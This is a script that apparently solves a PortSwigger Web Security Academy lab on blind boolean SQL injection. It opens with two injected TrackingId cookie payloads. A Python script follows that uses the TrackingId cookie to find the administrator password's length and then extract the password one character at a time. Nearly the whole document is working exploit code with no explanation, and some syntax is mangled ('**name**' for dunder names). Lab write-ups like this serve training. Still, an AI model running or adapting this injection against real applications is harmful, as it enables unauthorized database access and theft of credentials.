```bash
Cookie: TrackingId=x1YyULTT8uc0QqBq' and true -- -;

Cookie: TrackingId=x1YyULTT8uc0QqBq' and ( length (( select password from users where username='administrator' )) = 20 ) -- -;

#!/usr/bin/env python3

from **future** import annotations

import requests
from requests import Response
from typing import Optional

# GLOBAL CONFIGURATION

URL: str = (
"https://0a7b006704d68e9c8022cbd3007f00a8."
"web-security-academy.net/filter?category=Accessories"
)

TRACKING_ID_BASE: str = "m23ppozB0e9LZryx"
SESSION_ID: str = "lRscVEWrC48xhUpzLFpGZDaQbitO1PXx"

CHARACTERS: str = "abcdefghijklmnopqrstuvwxyz1234567890"

TIMEOUT: int = 3
SUCCESS_TEXT: str = "Welcome back!"

PASSWORD_MIN_LENGTH: int = 7
PASSWORD_MAX_LENGTH: int = 60

# HELPER FUNCTIONS

def is_url_reachable(url: str) -> bool:
"""Check if the target URL is reachable."""
try:
response: Response = requests.get(url, timeout=TIMEOUT)
return response.status_code == 200
except requests.RequestException as exc:
print(f"[!] Error reaching URL: {exc}")
return False

def send_payload(payload: str) -> bool:
"""
Send payload via cookie and check for success condition.
"""
cookies = {
"TrackingId": TRACKING_ID_BASE + payload,
"session": SESSION_ID,
}

    response: Response = requests.get(URL, cookies = cookies)
    return SUCCESS_TEXT in response.text

# CORE LOGIC

def get_password_length() -> Optional[int]:
"""Determine administrator password length."""
print("[*] Finding password length...")

    for length in range(PASSWORD_MIN_LENGTH, PASSWORD_MAX_LENGTH + 1):
        payload = (
            f"' AND LENGTH((SELECT password FROM users "
            f"WHERE username='administrator')) = {length}--"
        )

        if send_payload(payload):
            print(f"[+] Password length found: {length}")
            return length

    print("[-] Failed to determine password length.")
    return None

def extract_password(length: int) -> Optional[str]:
"""Extract administrator password character by character."""
print("[*] Extracting password...")
password: str = ""

    for position in range(1, length + 1):
        found = False

        for char in CHARACTERS:
            payload = (
                f"' AND SUBSTRING(("
                f"SELECT password FROM users WHERE username='administrator'"
                f"), {position}, 1) = '{char}'--"
            )

            if send_payload(payload):
                password += char
                print(f"[+] Position {position}: {char}")
                found = True
                break

        if not found:
            print(f"[-] Failed at position {position}")
            return None

    return password

# ENTRY POINT

def main() -> None:
if not is_url_reachable(URL):
print("[-] Target URL is not reachable. Exiting.")
return

    print("[+] Target reachable. Starting attack...")

    length = get_password_length()
    if length is None:
        return

    password = extract_password(length)
    if password:
        print(f"\n[✔] Password extracted successfully: {password}")
    else:
        print("\n[-] Failed to extract password.")

if **name** == "**main**":
main()

```
